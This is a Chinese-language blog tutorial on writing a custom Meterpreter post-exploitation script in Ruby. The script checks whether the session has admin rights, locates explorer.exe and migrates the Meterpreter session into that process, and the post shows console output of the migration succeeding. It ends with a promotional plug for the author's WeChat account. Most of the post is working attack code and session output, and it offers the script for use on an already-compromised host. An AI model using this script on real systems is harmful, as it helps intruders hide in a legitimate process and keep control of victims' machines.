---
layout: post
category: binghe-code-hack
title: Metasploit制作并运行自定义Meterpreper脚本
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Metasploit制作并运行自定义Meterpreper脚本
lock: need
---

# Metasploit制作并运行自定义Meterpreper脚本

注意：运行此脚本的前提是我们已经经过一系列的渗透，成功拿下了Meterpreter命令行。

这个脚本将会检查我们当前用户是否为管理员用户，然后找到explorer.exe进程，并自动迁移到这个进程中。

具体脚本mymet.rb如下：

```
##
# Author 冰河
# Date 2019-01-14
# Description Meterpreter脚本实例，检查 我们当前是否为管理员用户，然后找到exeplorer进程，并自动迁移到这个进程中
##
admin_check=is_admin?
if(admin_check)
  print_good("Current User Is Admin")
else
  print_error("Current User Is Not Admin")
end

session.sys.process.get_processes().each do |x|
  if x['name'].downcase == "explorer.exe"
    print_good("Explorer.exe Process is Running with PID #{x['pid']}")
    explorer_ppid = x['pid'].to_i
    print_good("Migrating to Exeplorer.exe at PID #{explorer_ppid.to_s}")
    session.core.migrate(explorer_ppid)
  end
end
```

接下来，我们将脚本mymet.rb上传到Kali的/usr/share/metasploit-framework/scripts/meterpreter目录下。

首先，我们现在Meterpreter上执行如下命令：

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
meterpreter > getpid
Current pid: 684
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
2208  2168  explorer.exe       x64   1        liuyazhuang-PC\liuyazhuang    C:\Windows\explorer.exe
```

可以看到当前的用户是管理员权限，当前session绑定的进程ID是684，explorer进程ID为2208

接下来我们在Meterpreter命令行下运行如下命令：

```
run myset
```

输出如下：

```
meterpreter > run mymet 
[+] Current User Is Admin
[+] Explorer.exe Process is Running with PID 2208
[+] Migrating to Exeplorer.exe at PID 2208
```

如下：

![img](https://img-blog.csdnimg.cn/20190115160713658.png)

可以看到，命令成功运行

此时我们再次查看当前session绑定的PID

```
meterpreter > getpid
Current pid: 2208
```

可以看到当前session已经绑定到explorer.exe进程了。

## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)